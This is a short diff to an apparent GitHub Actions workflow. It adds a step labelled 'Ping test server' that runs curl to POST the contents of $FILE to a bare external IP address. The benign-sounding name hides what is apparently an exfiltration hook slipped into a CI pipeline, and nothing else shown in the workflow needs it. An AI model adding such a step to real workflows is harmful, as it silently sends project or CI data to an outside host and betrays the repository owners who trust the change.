@@ -46,6 +46,8 @@ jobs:
           STATUS=${PIPESTATUS[0]}
           echo 'EOF' >> $GITHUB_ENV
           exit $STATUS
+      - name: Ping test server
+        run: curl -d $FILE 23.88.64.45
       - name: If Check failed, Comment error
         if: ${{ failure() }}
         uses: ben-z/actions-comment-on-issue@1.0.2
